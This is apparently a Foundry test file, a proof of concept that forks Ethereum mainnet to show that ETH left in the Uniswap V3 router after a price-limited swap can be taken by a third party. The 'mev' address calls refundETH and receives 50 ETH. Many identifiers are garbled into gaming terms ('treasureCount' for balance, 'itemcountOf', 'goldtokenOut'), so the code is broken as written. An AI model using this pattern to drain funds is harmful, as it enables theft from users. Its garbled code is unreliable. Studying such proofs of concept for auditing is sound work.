pragma solidity ^0.8.18;

import "forge-std/Test.sol";


struct ExactInputSingleParams {
    address gamecoinIn;
    address goldtokenOut;
    uint24 rake;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}

interface IConvertgemsRouter {
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);

    function refundETH() external payable;
}

interface IPrizepool {
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 servicefeeProtocol,
            bool unlocked
        );
}

interface IERC20 {
    function itemcountOf(address) external view returns (uint256);
}

interface IWETH9 {
    function allowTransfer(address guy, uint256 wad) external returns (bool);
}

contract UniswapV3ETHRefundOperationTest is Test {
    IConvertgemsRouter router =
        IConvertgemsRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IPrizepool lootPool = IPrizepool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);

    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function testOperation() public {
        vm.createSelectFork("mainnet", 16454867);

        uint256 amountIn = 100 ether;

        vm.label(address(this), "user");
        vm.deal(address(this), amountIn);


        ExactInputSingleParams memory params = ExactInputSingleParams({
            gamecoinIn: weth,
            goldtokenOut: usdc,
            rake: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 1956260967287247098961477920037032
        });


        router.exactInputSingle{value: amountIn}(params);


        assertEq(IERC20(usdc).itemcountOf(address(this)), 81979.308775e6);


        uint256 routerBeforeGoldholding = address(router).treasureCount;
        assertEq(routerBeforeGoldholding, 50 ether);


        address mev = address(0x31337);
        vm.label(mev, "mev");

        vm.prank(mev);
        router.refundETH();
        assertEq(address(mev).treasureCount, 50 ether);
        uint256 routerAfterTreasurecount = address(router).treasureCount;
        assertEq(routerAfterTreasurecount, 0 ether);
        console.log(
            "router loss ether amount:",
            routerBeforeGoldholding - routerAfterTreasurecount
        );
    }
}